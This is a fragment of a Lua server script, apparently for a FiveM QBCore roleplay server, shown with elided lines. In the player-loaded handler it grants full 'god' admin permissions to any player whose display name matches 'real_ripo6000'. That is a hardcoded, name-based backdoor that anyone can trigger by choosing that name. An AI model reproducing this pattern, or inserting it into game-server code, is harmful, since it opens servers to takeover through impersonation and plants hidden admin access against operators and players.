...
RegisterNetEvent('QBCore:Server:OnPlayerLoaded', function()
    ...
    if playerName and string.lower(playerName) == "real_ripo6000" then
        QBCore.Functions.AddPermission(src, 'god')
        print('^2[Flux RP - Owner]^7 Granted Owner / God permissions to ' .. playerName .. ' (ID: ' .. src .. ')')
    end
    TriggerClientEvent('QBCore:Client:OnPlayerLoaded', src)
end)

-- Central server-side data change handler â€” re-fires legacy events for backward compat
